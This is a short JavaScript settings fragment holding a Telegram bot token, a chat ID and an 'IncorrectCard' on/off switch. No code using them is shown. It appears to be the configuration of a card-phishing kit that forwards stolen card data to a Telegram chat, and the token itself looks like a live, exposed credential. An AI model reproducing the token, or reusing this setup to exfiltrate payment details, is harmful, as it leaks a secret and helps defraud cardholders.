const BOT_TOKEN = "8652379563:AAFsmJ5rgrxPVXht7ZM3hXGnxEE-wbGO4Mo";
const CHAT_ID = "5157201609";
//set on OR off
const IncorrectCard = "off";
